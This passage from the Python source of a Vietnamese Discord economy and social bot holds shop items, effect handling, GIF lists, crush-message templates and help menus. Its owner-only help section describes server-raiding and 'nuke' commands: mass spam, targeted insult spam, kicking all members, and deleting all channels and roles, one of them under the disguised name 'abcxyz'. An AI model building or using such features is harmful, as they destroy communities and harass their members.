        "effect_type": "win_rate_boost",
        "effect_value": 0.2,
        "duration": 1,
        "desc": "Tăng 20% tỉ lệ thắng cho 1 ván chơi"
    },
    "💰 Nhẫn Nhân Đôi": {
        "price": 800,
        "effect_type": "bonus_multiplier",
        "effect_value": 2.0,
        "duration": 1,
        "desc": "Nhân đôi tiền thắng ở ván tiếp theo"
    },
    "💰 Nhẫn Nhân Ba": {
        "price": 2000,
        "effect_type": "bonus_multiplier",
        "effect_value": 3.0,
        "duration": 1,
        "desc": "Nhân ba tiền thắng ở ván tiếp theo"
    },
    "🛡️ Khiên Bảo Vệ Cấp 1": {
        "price": 600,
        "effect_type": "shield",
        "effect_value": 1,
        "duration": 1,
        "desc": "Bảo vệ khỏi mất coin khi thua 1 lần"
    },
    "🛡️ Khiên Bảo Vệ Cấp 2": {
        "price": 1500,
        "effect_type": "shield",
        "effect_value": 3,
        "duration": 3,
        "desc": "Bảo vệ khỏi mất coin khi thua 3 lần"
    },
    "💫 Bùa Hồi Sinh": {
        "price": 1000,
        "effect_type": "refund",
        "effect_value": 0.5,
        "duration": 1,
        "desc": "Hoàn lại 50% tiền cược khi thua 1 lần"
    },
    "📚 Sách Kinh Nghiệm": {
        "price": 700,
        "effect_type": "instant_exp",
        "effect_value": 50,
        "duration": 0,
        "desc": "Tăng 50 EXP ngay lập tức"
    },
    "📚 Sách Kinh Nghiệm Lớn": {
        "price": 2000,
        "effect_type": "instant_exp",
        "effect_value": 200,
        "duration": 0,
        "desc": "Tăng 200 EXP ngay lập tức"
    },
    "⏳ Đồng Hồ Cát": {
        "price": 1200,
        "effect_type": "reset_cooldown",
        "effect_value": "daily",
        "duration": 0,
        "desc": "Reset cooldown nhận daily"
    },
    "🎭 Mặt Nạ Ăn Xin": {
        "price": 400,
        "effect_type": "reset_cooldown",
        "effect_value": "beg",
        "duration": 0,
        "desc": "Reset cooldown lệnh beg"
    },
    "🥷 Áo Choàng Tàng Hình": {
        "price": 800,
        "effect_type": "reset_cooldown",
        "effect_value": "crime",
        "duration": 0,
        "desc": "Reset cooldown lệnh crime"
    },
    "🎰 Mắt Thần Slots": {
        "price": 2500,
        "effect_type": "slots_boost",
        "effect_value": 2.0,
        "duration": 3,
        "desc": "Tăng tỉ lệ trúng slots (cho 3 ván)"
    },
    "🎲 Xúc Xắc May Mắn": {
        "price": 1500,
        "effect_type": "dice_boost",
        "effect_value": 0.6,
        "duration": 2,
        "desc": "Tăng tỉ lệ đoán dice lên 60% (cho 2 ván)"
    },
    "✂️ Găng Tay Đấm Bốc": {
        "price": 1000,
        "effect_type": "rps_boost",
        "effect_value": 0.7,
        "duration": 2,
        "desc": "Tăng tỉ lệ thắng RPS lên 70% (cho 2 ván)"
    },
    "🪙 Đồng Xu Hai Mặt": {
        "price": 800,
        "effect_type": "coinflip_boost",
        "effect_value": 0.6,
        "duration": 2,
        "desc": "Tăng tỉ lệ thắng coinflip lên 60% (cho 2 ván)"
    },
    "🃏 Bộ Bài Át": {
        "price": 1800,
        "effect_type": "blackjack_boost",
        "effect_value": 22,
        "duration": 2,
        "desc": "Tăng điểm tối đa trong Blackjack lên 22 (cho 2 ván)"
    },
    "🍀 Vé Số May Mắn": {
        "price": 1200,
        "effect_type": "lottery_boost",
        "effect_value": 0.4,
        "duration": 1,
        "desc": "Tăng tỉ lệ trúng lottery lên 40% (1 lần)"
    },
    "🚀 Tên Lửa Tăng Áp": {
        "price": 1400,
        "effect_type": "crash_boost",
        "effect_value": 5.0,
        "duration": 1,
        "desc": "Tăng hệ số tối đa trong crash lên 5.0 (1 lần)"
    },
    "🎴 Kính Lúp Hilo": {
        "price": 1000,
        "effect_type": "hilo_boost",
        "effect_value": 0.55,
        "duration": 2,
        "desc": "Tăng tỉ lệ thắng Hilo lên 55% (cho 2 ván)"
    }
}

player_effects = {}

def load_effects():
    global player_effects
    player_effects = load_json(EFFECT_FILE, {})

def save_effects():
    save_json(EFFECT_FILE, player_effects)

load_effects()

def add_effect(user_id, effect_type, effect_value, duration):
    uid = str(user_id)
    if uid not in player_effects:
        player_effects[uid] = {}
    if effect_type in player_effects[uid]:
        old_dur = player_effects[uid][effect_type]['duration']
        player_effects[uid][effect_type]['duration'] = old_dur + duration
    else:
        player_effects[uid][effect_type] = {'value': effect_value, 'duration': duration}
    save_effects()

def consume_effect(user_id, effect_type):
    uid = str(user_id)
    if uid not in player_effects or effect_type not in player_effects[uid]:
        return None
    effect = player_effects[uid][effect_type]
    if effect['duration'] <= 0:
        del player_effects[uid][effect_type]
        save_effects()
        return None
    effect['duration'] -= 1
    value = effect['value']
    if effect['duration'] <= 0:
        del player_effects[uid][effect_type]
    save_effects()
    return value

def has_effect(user_id, effect_type):
    uid = str(user_id)
    if uid not in player_effects or effect_type not in player_effects[uid]:
        return False
    return player_effects[uid][effect_type]['duration'] > 0

# ==================== GAME WIN/LOSE MESSAGES ====================
WIN_REACTIONS = [
    "🎉 Chúc mừng! Bạn thật may mắn!",
    "🔥 Bùng nổ! Chiến thắng ngoạn mục!",
    "💪 Quá đỉnh! Bạn là cao thủ!",
    "🌟 Thần may mắn đang đứng về phía bạn!",
    "🍀 Cỏ bốn lá phát huy tác dụng!",
    "🎊 Ăn mừng đi nào!",
    "🤩 Xuất sắc! Tiếp tục phát huy!",
    "💰 Tiền vào như nước!",
]
LOSE_REACTIONS = [
    "😢 Rất tiếc! Lần sau sẽ khác.",
    "💀 Trời ơi, xui quá!",
    "🤣 Thua rồi, cố gắng lần sau nhé!",
    "😭 Đừng nản, còn nhiều cơ hội!",
    "😅 Lần này chưa may, chơi lại đi!",
    "🤦‍♂️ Sai lầm đáng tiếc!",
    "😤 Tức quá, nhưng đừng bỏ cuộc!",
    "💔 Mất tiền rồi, nhưng vui là chính!",
]

def get_win_msg():
    return random.choice(WIN_REACTIONS)

def get_lose_msg():
    return random.choice(LOSE_REACTIONS)

# ==================== GIF LISTS ====================
GIF_LOVE = [
    "https://i.pinimg.com/originals/75/84/17/75841749adcb1bf105c8d75a602f5751.gif",
    "https://i.pinimg.com/originals/d4/9d/a9/d49da9f2d59c18322827e925f6880403.gif",
    "https://i.pinimg.com/originals/a8/96/5d/a8965dd2ec2662212f783c92248c7adf.gif",
    "https://i.pinimg.com/originals/60/bd/28/60bd28e041d83ed07ac88e00d30843d5.gif",
    "https://i.pinimg.com/originals/5c/a5/cf/5ca5cf3c67f294e666179989e4a5ba6b.gif",
]
GIF_HUG = [
    "https://i.pinimg.com/originals/16/f4/ef/16f4ef8659534c88264670265e2a1626.gif",
    "https://i.pinimg.com/originals/56/c7/3f/56c73f380d3ad747ff0600eb7ea1bbc7.gif",
    "https://i.pinimg.com/originals/0b/6b/d7/0b6bd7ba263b15094cae8450a68ff54b.gif",
    "https://i.pinimg.com/originals/46/0c/80/460c80d4423b0ba75ed9592b05599592.gif",
    "https://i.pinimg.com/originals/45/9c/c2/459cc283ee9bddcf14be26902c85cbd7.gif",
]
GIF_KISS = [
    "https://i.pinimg.com/originals/10/5a/7a/105a7ad7edbe74e5ca834348025cc650.gif",
    "https://i.pinimg.com/originals/a6/ab/46/a6ab46896615b80980ff4da911a1e167.gif",
    "https://i.pinimg.com/originals/ef/cc/cb/efcccb410c47e35559e71c8435505dbc.gif",
    "https://i.pinimg.com/originals/4a/38/9b/4a389bb65d9096a14992e74f83e6f55b.gif",
    "https://i.pinimg.com/originals/df/69/25/df692538bbf513f7bd94709435e96342.gif",
]
GIF_SLAP = [
    "https://i.pinimg.com/originals/2b/3a/3e/2b3a3e107ac57d4f170a8f8e414fec9f.gif",
    "https://i.pinimg.com/originals/7c/20/89/7c2089abf87dc52deb4179a6835088b6.gif",
    "https://i.pinimg.com/originals/12/2d/46/122d469b39b533d9490334d681d6c11a.gif",
    "https://i.pinimg.com/originals/ca/d7/62/cad7625a5c73d0c73bc67329174f9003.gif",
    "https://i.pinimg.com/originals/96/8c/b1/968cb1f9eaa12dde1d6fdf2f6ee296ed.gif",
]
GIF_PAT = [
    "https://i.pinimg.com/originals/e3/e2/58/e3e2588fbae9422f2bd4813c324b1298.gif",
    "https://i.pinimg.com/originals/95/86/e2/9586e24faa0664df1d01e3eab4a138f4.gif",
    "https://i.pinimg.com/originals/ce/22/9e/ce229e98f5cd4944a6315acf9cc8722c.gif",
    "https://i.pinimg.com/originals/b5/07/a4/b507a44553c871c0d7d69d8df5e414d6.gif",
    "https://i.pinimg.com/originals/37/73/55/3773555d02b0b946a30160e54d45589a.gif",
]
GIF_CUDDLE = [
    "https://i.pinimg.com/originals/a4/5e/ea/a45eea4151c014f6c48f20d7dd5167bb.gif",
    "https://i.pinimg.com/originals/87/63/46/8763461fd726e1cbfcd076d04c9513fe.gif",
    "https://i.pinimg.com/originals/8f/8b/a3/8f8ba3baeecdf28f3e0fa7d4ce1a8586.gif",
    "https://i.pinimg.com/originals/d2/53/83/d253835a6c993c65d2aa60ea848b6bb0.gif",
    "https://i.pinimg.com/originals/62/f5/aa/62f5aa2069259407435ee62b55962fbd.gif",
]
GIF_CRUSH = [
    "https://i.pinimg.com/originals/56/7a/66/567a666acdbccdf66f5afd02ee0fa997.gif",
    "https://i.pinimg.com/originals/fa/ae/32/faae32dc5b2099875d71b1eb62e27c60.gif",
    "https://i.pinimg.com/originals/7e/3b/e6/7e3be64966948331af33678199ce2089.gif",
    "https://i.pinimg.com/originals/e8/fd/6a/e8fd6a12c3422c6d25abe2742050cc4c.gif",
    "https://i.pinimg.com/originals/d5/33/52/d53352435cac71ab198b998146641752.gif",
]

CRUSH_MESSAGES = [
    "{target_name} ơi, {author_name} muốn nói rằng trái tim này đã thuộc về bạn từ lâu rồi 💘",
    "Này {target_name}, {author_name} không biết từ khi nào lại thích bạn nhiều đến thế 🥰",
    "{target_name} à, {author_name} có một bí mật: tớ thích cậu rất nhiều ❤️",
    "Chào {target_name}, {author_name} chỉ muốn nói là bạn đẹp nhất trong mắt tớ 🌹",
    "{target_name} ơi, {author_name} crush bạn mất rồi, phải làm sao đây 😳",
    "Gửi {target_name}, {author_name} muốn bày tỏ rằng bạn là người đặc biệt nhất 💖",
    "{target_name} à, {author_name} thích bạn đến mức không thể giấu được nữa 😊",
    "Này {target_name}, {author_name} có thể mời bạn một ly cà phê không? ☕",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là ánh nắng trong ngày của tớ 🌞",
    "Gửi {target_name}, {author_name} không cần cả thế giới, chỉ cần có bạn là đủ 💑",
    "{target_name} à, {author_name} thích nụ cười của bạn, nó làm tớ tan chảy 😍",
    "Này {target_name}, {author_name} có thể nói là bạn rất dễ thương không? 🥺",
    "{target_name} ơi, {author_name} muốn nói rằng trái tim tớ đã có chủ rồi 💘",
    "Gửi {target_name}, {author_name} chỉ muốn bạn biết rằng bạn rất quan trọng với tớ ❤️",
    "{target_name} à, {author_name} thích bạn từ cái nhìn đầu tiên 👀",
    "Này {target_name}, {author_name} muốn nói rằng bạn là giấc mơ của tớ 🌙",
    "{target_name} ơi, {author_name} không thể ngừng nghĩ về bạn 💭",
    "Gửi {target_name}, {author_name} muốn nói rằng bạn là điều tuyệt vời nhất từng đến với tớ 💫",
    "{target_name} à, {author_name} thích bạn nhiều hơn cả sô cô la 🍫",
    "Này {target_name}, {author_name} muốn được nắm tay bạn đi khắp nơi 🤝",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là lý do tớ mỉm cười mỗi ngày 😊",
    "Gửi {target_name}, {author_name} có thể nói rằng bạn rất đặc biệt không? 🥰",
    "{target_name} à, {author_name} thích bạn đến mức không thể tập trung làm gì khác 😅",
    "Này {target_name}, {author_name} muốn nói rằng bạn là ngôi sao sáng nhất trên bầu trời ⭐",
    "{target_name} ơi, {author_name} có cảm giác như đã quen bạn từ rất lâu rồi 💞",
    "Gửi {target_name}, {author_name} muốn nói rằng bạn là tất cả những gì tớ cần ❤️",
    "{target_name} à, {author_name} thích bạn, thích rất nhiều, thích đến điên dại 😘",
    "Này {target_name}, {author_name} có thể nói rằng bạn làm trái tim tớ loạn nhịp không? 💓",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là món quà tuyệt vời nhất 🎁",
    "Gửi {target_name}, {author_name} chỉ muốn bạn biết rằng tớ thích bạn 💌",
    "{target_name} à, {author_name} thích bạn như cách hoa hướng dương luôn hướng về mặt trời 🌻",
    "Này {target_name}, {author_name} muốn nói rằng bạn là định mệnh của tớ 💫",
    "{target_name} ơi, {author_name} có thể dành cả ngày chỉ để nhìn bạn cười 😊",
    "Gửi {target_name}, {author_name} muốn nói rằng bạn là người tuyệt vời nhất trên đời 💖",
    "{target_name} à, {author_name} thích bạn, không cần lý do gì cả ❤️",
    "Này {target_name}, {author_name} muốn nói rằng bạn là giấc mơ thành hiện thực của tớ 🌠",
    "{target_name} ơi, {author_name} muốn nói rằng trái tim tớ chỉ hướng về bạn 💘",
    "Gửi {target_name}, {author_name} có thể nói rằng bạn rất dễ thương và tớ thích bạn không? 🥰",
    "{target_name} à, {author_name} thích bạn nhiều hơn cả những gì tớ có thể nói 💬",
    "Này {target_name}, {author_name} muốn nói rằng bạn là người tớ tìm kiếm bấy lâu nay 🔍",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là ánh sáng cuối đường hầm của tớ 🕯️",
    "Gửi {target_name}, {author_name} muốn nói rằng bạn là điều đẹp đẽ nhất trong cuộc sống của tớ 🌸",
    "{target_name} à, {author_name} thích bạn, thích cả những điều nhỏ nhặt nhất về bạn 😊",
    "Này {target_name}, {author_name} muốn nói rằng bạn là lý do tớ thức dậy mỗi sáng ☀️",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là người tớ muốn dành cả đời để yêu 💑",
    "Gửi {target_name}, {author_name} có thể nói rằng bạn là niềm vui của tớ không? 🥰",
    "{target_name} à, {author_name} thích bạn, và tớ sẽ thích bạn rất lâu ❤️",
    "Này {target_name}, {author_name} muốn nói rằng bạn là người đặc biệt nhất trong vũ trụ này 🌌",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là người tớ luôn nghĩ đến trước khi ngủ 😴",
    "Gửi {target_name}, {author_name} muốn nói rằng bạn là mảnh ghép còn thiếu của tớ 🧩",
    "{target_name} à, {author_name} thích bạn, thích đến mức không thể giấu được nữa 😊",
    "Này {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn chia sẻ mọi thứ cùng 👫",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là người tớ muốn bảo vệ và yêu thương 💖",
    "Gửi {target_name}, {author_name} có thể nói rằng bạn là người tớ muốn nắm tay đi đến cuối đời không? 💍",
    "{target_name} à, {author_name} thích bạn, và tớ sẽ không bao giờ hối hận về điều đó ❤️",
    "Này {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn gặp mỗi ngày 😊",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là người tớ muốn nói chuyện suốt đêm 🌙",
    "Gửi {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn dành tặng những điều tốt đẹp nhất 🎁",
    "{target_name} à, {author_name} thích bạn, và tớ sẽ thích bạn đến khi nào trái tim còn đập 💓",
    "Này {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn giữ chặt không bao giờ buông tay 🤝",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là người tớ muốn yêu thương bằng cả trái tim 💘",
    "Gửi {target_name}, {author_name} có thể nói rằng bạn là người tớ muốn gọi là 'người yêu' không? 😳",
    "{target_name} à, {author_name} thích bạn, và tớ sẽ thích bạn đến khi nào bạn không cần tớ nữa ❤️",
    "Này {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn ôm vào mỗi buổi sáng 🤗",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là người tớ muốn nắm tay đi dạo dưới mưa ☔",
    "Gửi {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn cùng ngắm sao trên bầu trời ⭐",
    "{target_name} à, {author_name} thích bạn, và tớ sẽ thích bạn đến khi nào bạn còn mỉm cười 😊",
    "Này {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn dành tặng nụ hôn đầu tiên 😘",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là người tớ muốn nói lời yêu thương mỗi ngày 💌",
    "Gửi {target_name}, {author_name} có thể nói rằng bạn là người tớ muốn che chở khỏi mọi bão giông 🌧️",
    "{target_name} à, {author_name} thích bạn, và tớ sẽ thích bạn đến khi nào trái đất ngừng quay 🌍",
    "Này {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn làm cho hạnh phúc mỗi ngày 😊",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là người tớ muốn yêu thương bằng cả trái tim và tâm hồn 💖",
    "Gửi {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn dành cả cuộc đời này để bên cạnh 💑",
    "{target_name} à, {author_name} thích bạn, và tớ sẽ thích bạn đến khi nào bạn còn cần tớ ❤️",
    "Này {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn gọi mỗi khi mệt mỏi 📞",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là người tớ muốn dựa vào mỗi khi yếu đuối 🤗",
    "Gửi {target_name}, {author_name} có thể nói rằng bạn là người tớ muốn chia sẻ cả niềm vui và nỗi buồn không? 🥺",
    "{target_name} à, {author_name} thích bạn, và tớ sẽ thích bạn đến khi nào bạn không còn cần tớ nữa ❤️",
    "Này {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn nắm tay đi hết cuộc đời này 👫",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là người tớ muốn yêu thương và trân trọng mỗi ngày 💎",
    "Gửi {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn dành tặng những điều ngọt ngào nhất 🍯",
    "{target_name} à, {author_name} thích bạn, và tớ sẽ thích bạn đến khi nào trái tim này còn đập vì bạn 💓",
    "Này {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn gọi là người yêu dấu của tớ 💑",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là người tớ muốn ôm mỗi khi trời lạnh 🧣",
    "Gửi {target_name}, {author_name} có thể nói rằng bạn là người tớ muốn gửi trao trọn vẹn con tim này không? 💘",
    "{target_name} à, {author_name} thích bạn, và tớ sẽ thích bạn đến khi nào bạn không cần tớ nữa ❤️",
    "Này {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn cùng nhau già đi 👵👴",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là người tớ muốn yêu thương bằng cả sinh mệnh này 🌟",
    "Gửi {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn bảo vệ khỏi mọi nỗi buồn 🛡️",
    "{target_name} à, {author_name} thích bạn, và tớ sẽ thích bạn đến khi nào bạn còn nhìn tớ bằng ánh mắt dịu dàng đó 😊",
    "Này {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn nắm tay đi khắp thế gian 🌍",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là người tớ muốn gửi trao nụ cười hạnh phúc mỗi ngày 😊",
    "Gửi {target_name}, {author_name} có thể nói rằng bạn là người tớ muốn yêu thương đến khi nào trái tim ngừng đập không? 💖",
    "{target_name} à, {author_name} thích bạn, và tớ sẽ thích bạn đến khi nào bạn không cần tớ nữa ❤️",
    "Này {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn gọi là 'cả thế giới' của tớ 🌎",
    "{target_name} ơi, {author_name} muốn nói rằng bạn là người tớ muốn dành tặng trọn vẹn tình yêu này 💘",
    "Gửi {target_name}, {author_name} muốn nói rằng bạn là người tớ muốn yêu thương và chiều chuộng mỗi ngày 🥰",
    "{target_name} à, {author_name} thích bạn, và tớ sẽ thích bạn đến khi nào bạn còn muốn tớ ở bên cạnh ❤️",
]

# ==================== HELP DATA ====================
HELP_CATEGORIES = {
    "👾 Lệnh Độc Quyền Owner": {
        "emoji": "👾",
        "description": "Bộ công cụ tối cao dành riêng cho Boss Bảo và Owners – quản trị server, phá hoại, kiểm soát tuyệt đối.",
        "commands": {
            "n! spam": "👾 Bắt đầu spam tất cả các kênh",
            "n! stopspam": "🛑 Dừng hệ thống spam",
            "n! spamroast @user <số>": "🔥 Spam chửi thành viên chỉ định",
            "n! kick @user [lý do]": "🦵 Kick thành viên ra khỏi server",
            "n! ban @user [lý do]": "🔨 Cấm thành viên khỏi server",
            "n! unban <id>": "✅ Gỡ ban cho thành viên qua ID",
            "n! massban @user1 @user2...": "🔨 Cấm nhiều người cùng lúc",
            "n! mute @user [thời gian]": "🔇 Tắt tiếng (timeout) thành viên",
            "n! unmute @user": "🔊 Bỏ tắt tiếng thành viên",
            "n! timeout @user <thời gian>": "⏳ Timeout thành viên (m, d, w, t)",
            "n! deafen @user": "🔇 Làm điếc trong voice",
            "n! undeafen @user": "🔊 Bỏ điếc trong voice",
            "n! move @user #voice": "🚪 Di chuyển thành viên sang voice khác",
            "n! moveall #voice": "🚪 Di chuyển tất cả thành viên vào voice",
            "n! warn @user [lý do]": "⚠️ Gửi cảnh cáo qua DM",
            "n! kickall": "👢 Kick toàn bộ thành viên (trừ Owner)",
            "n! masskick @user1 @user2...": "👢 Kick nhiều người cùng lúc",
            "n! createchannel <tên>": "🆕 Tạo kênh văn bản mới",
            "n! deletechannel [#kênh]": "🗑️ Xóa kênh được chọn",
            "n! lockchannel [#kênh]": "🔒 Khóa kênh văn bản",
            "n! unlockchannel [#kênh]": "🔓 Mở khóa kênh văn bản",
            "n! createcategory <tên>": "📁 Tạo Danh mục (Category) mới",
            "n! renamechannel #kênh <tên mới>": "✏️ Đổi tên kênh",
            "n! settopic #kênh <nội dung>": "📝 Đặt chủ đề cho kênh",
            "n! setnsfw #kênh <true/false>": "🔞 Bật/Tắt chế độ NSFW",
            "n! hide #kênh": "🙈 Ẩn kênh (chỉ admin thấy)",
            "n! reveal #kênh": "👀 Hiện kênh (mọi người thấy)",
            "n! vc <tên>": "🔊 Tạo voice channel mới",
            "n! clonechannel #kênh": "📋 Clone kênh hiện tại",
            "n! deleteallchannels": "💣 Xóa toàn bộ kênh (có xác nhận)",
            "n! spamchannels <số>": "🚀 Tạo hàng loạt kênh spam",
            "n! spamroles <số>": "🎭 Tạo hàng loạt role spam",
            "n! deleteallroles": "🗑️ Xóa toàn bộ role (trừ @everyone)",
            "n! createrole <tên>": "🎭 Tạo role mới",
            "n! deleterole <tên>": "🗑️ Xóa role khỏi server",
            "n! role @user <tên role>": "🎭 Gán role cho thành viên",
            "n! removerole @user <tên role>": "🎭 Xóa role khỏi thành viên",
            "n! purge all": "🧹 Xóa sạch toàn bộ tin nhắn server",
            "n! clear <số>": "🧹 Xóa tin nhắn trong kênh (tối đa 1000)",
            "n! slowmode <giây>": "🐢 Cài slowmode cho kênh hiện tại",
            "n! nick @user <nick>": "✏️ Đổi nickname cho thành viên",
            "n! resetnick @user": "🔄 Reset nickname về mặc định",
            "n! setservername <tên>": "📝 Đổi tên server",
            "n! rename <tên>": "📝 Đổi tên server (cách viết khác)",
            "n! setservericon [url]": "🖼️ Đổi icon server (từ URL)",
            "n! icon [url]": "🖼️ Đổi icon server (cách viết khác)",
            "n! emoji": "🎨 Xem danh sách emoji của server",
            "n! steal <id> <tên>": "🎨 Copy emoji từ server khác",
            "n! webhookspam": "💬 Spam webhook (cú pháp mới)",
            "n! addwebhook": "➕ Tạo webhook hàng loạt",
            "n! stopwebhookspam": "🛑 Dừng webhook spam",
            "n! setwelcome #kênh": "🎉 Đặt kênh chào mừng",
            "n! setgoodbye #kênh": "😢 Đặt kênh tạm biệt",
            "n! setlevelchannel #kênh": "📈 Đặt kênh thông báo Level Up",
            "n! log #kênh": "📋 Đặt kênh log sự kiện",
            "n! setlv <level> @user": "📊 Đặt level cho người chơi",
            "n! backup": "💾 Backup cấu hình server",
            "n! restore": "🔄 Khôi phục server từ backup",
            "n! addowner @user": "➕ Thêm đồng minh Owner",
            "n! deleteowner @user": "➖ Xóa Owner khỏi danh sách",
            "n! setup": "⚙️ Mở bảng điều khiển quản trị",
            "n! showsv": "🌐 Xem danh sách server bot đang tham gia",
            "n! off [lệnh]": "🚫 Tắt một lệnh hoặc toàn bộ bot",
            "n! on [lệnh]": "✅ Bật một lệnh hoặc bật lại bot",
            "n! abcxyz": "☢️ Lệnh nuke server (chỉ Owner)",
        }
    },
    "💰 Kinh Tế & Giải Trí": {
        "emoji": "💰",
        "description": "Hệ thống mini-game, cá cược, kiếm coin, cửa hàng và tủ đồ phong phú.",
        "commands": {
            "n! balance [@user]": "💰 Xem số dư coin của bạn hoặc người khác",
            "n! daily": "🎁 Nhận quà coin miễn phí mỗi ngày (24h)",
            "n! work": "🛠️ Làm việc kiếm coin",
            "n! give @user <số>": "💸 Chuyển coin cho người khác",
            "n! coinflip <số> <h/t>": "🪙 Tung đồng xu x2",
            "n! slots <số>": "🎰 Quay hũ – jackpot x5, trùng 2 x3",
            "n! rps <số> <r/p/s>": "✂️ Oẳn tù tì x2, hoàn 50% khi thua",
            "n! dice <số> <1-6>": "🎲 Đoán xúc xắc x5",
            "n! hilo <số> <h/l>": "🎴 Cao / thấp hơn 7 x2",
            "n! crash <số>": "🚀 Tên lửa – dừng đúng lúc nhân tiền",
            "n! lottery <số>": "🎫 Xổ số x10, cơ hội 25%",
            "n! blackjack <số>": "🃏 Xì dách 21 điểm x2",
            "n! beg": "🥺 Xin tiền (30s)",
            "n! crime": "🚨 Trộm cướp (60s, 55%)",
            "n! bank deposit <số/all>": "🏦 Gửi tiền vào ngân hàng",
            "n! bank withdraw <số/all>": "💸 Rút tiền từ ngân hàng",
            "n! leaderboard": "🏆 Bảng xếp hạng giàu nhất server",
            "n! topcoin": "🏆 Xếp hạng coin (top 10)",
            "n! toplevel": "🏆 Xếp hạng level (top 10)",
            "n! roulette <số> <red/black/số>": "🎰 Roulette – màu 60%, số 10%",
            "n! guess <số> <1-10>": "🎯 Đoán số bí mật x5",
            "n! baccarat <số> <player/banker/tie>": "🃏 Baccarat – player 55%, banker 45%, tie 20%",
            "n! tower <số>": "🏗️ Leo tháp – đoán đúng 3 lần x3",
            "n! mines <số>": "💣 Dò mìn – chọn ô an toàn x2",
            "n! wheel <số> <red/black/green>": "🎡 Vòng quay – red/black x2, green x10",
            "n! dicewar <số>": "⚔️ Đấu xúc xắc với bot – x2",
            "n! hunt <số>": "🏹 Săn bắn – tỉ lệ 60%, x2",
            "n! fishing <số>": "🎣 Câu cá – tỉ lệ 50%, x2",
            "n! mining <số>": "⛏️ Đào vàng – tỉ lệ 40%, x3",
            "n! rob @user": "💰 Cướp người chơi – lấy 10-30% coin",
            "n! duel @user <số>": "⚔️ Đấu tay đôi – ai lớn hơn thắng x2",
            "n! slapgame @user <số>": "👋 Tát người chơi – 50/50 x2",
            "n! shop": "🛒 Xem cửa hàng 20 vật phẩm hỗ trợ",
            "n! buyitem <tên> [số]": "💳 Mua vật phẩm từ shop",
            "n! inventory": "🎒 Xem tủ đồ cá nhân",
            "n! useitem <tên> [số]": "🔧 Sử dụng vật phẩm trong tủ đồ",
            "n! myeffects": "✨ Xem hiệu ứng đang hoạt động",
            "n! buyrole <tên>": "🏷️ Mua role bằng coin"
        }
    },
    "📊 Thông Tin & Hệ Thống": {
        "emoji": "📊",
        "description": "Xem thống kê server, độ trễ, bảng xếp hạng.",
        "commands": {
            "n! stats": "📊 Xem thông số chi tiết của server",
            "n! ping": "🏓 Kiểm tra độ trễ của bot",
            "n! topcoin": "🏆 Bảng xếp hạng những người có coin nhiều nhất",
            "n! toplevel": "🏆 Bảng xếp hạng level cao nhất",
            "n! serverinfo": "🌐 Thông tin chi tiết server",
            "n! userinfo @user": "👤 Thông tin chi tiết người dùng",
            "n! avatar @user": "🖼️ Xem avatar",
            "n! membercount": "👥 Số lượng thành viên",
            "n! listroles": "📋 Danh sách role",
            "n! listchannels": "📋 Danh sách kênh",
            "n! botinfo": "🤖 Thông tin bot",
            "n! uptime": "⏱️ Thời gian bot hoạt động",
            "n! invite": "🔗 Link mời bot"
        }
    },
    "💘 Tình yêu & Tương tác": {
        "emoji": "💘",
        "description": "Các lệnh tương tác vui vẻ, tỏ tình, kết hôn.",
        "commands": {
            "n! love @user1 @user2": "💘 Tỷ lệ tình yêu",
            "n! hug @user": "🤗 Ôm",
            "n! kiss @user": "😘 Hôn",
            "n! slap @user": "👋 Tát",
            "n! pat @user": "🫳 Vỗ đầu",
            "n! cuddle @user": "🥰 Âu yếm",
            "n! marry @user": "💍 Kết hôn",
            "n! divorce @user": "💔 Ly hôn",
            "n! ship @user1 @user2": "💞 Ghép đôi",
            "n! crush @user": "💌 Tỏ tình"
        }
    },
    "🎉 Chào mừng & Log": {
        "emoji": "🎉",
        "description": "Tự động chào thành viên mới, goodbye và log.",
        "commands": {
            "n! setwelcome #kênh": "🎉 Đặt kênh welcome",
            "n! setgoodbye #kênh": "👋 Đặt kênh goodbye",
            "n! log #kênh": "📋 Đặt kênh log",
            "n! setlevelchannel #kênh": "📈 Đặt kênh thông báo level"
        }
    },
    "🔊 Voice": {
        "emoji": "🔊",
        "description": "Điều khiển voice theo từng thành viên.",
        "commands": {
            "n! move @user #voice": "🚪 Di chuyển một thành viên",
            "n! deafen @user": "🔇 Deafen một thành viên",
            "n! undeafen @user": "🔊 Bỏ deafen",
            "n! vc <tên>": "🎙️ Tạo voice channel",
            "n! moveall #voice": "🚪 Di chuyển tất cả"
        }
    },
    "💾 Backup & Restore": {
        "emoji": "💾",
        "description": "Backup cấu trúc server và phục hồi.",
        "commands": {
            "n! backup": "💾 Lưu cấu trúc server ra JSON",
            "n! restore": "♻️ Tạo lại phần cấu trúc còn thiếu"
        }
    }
}

EXTENDED_HELP_CATEGORIES = {
    '🏠 Cơ Bản': {
        'description': 'Bộ lệnh mở rộng được thiết kế theo nhóm.',
        'commands': [
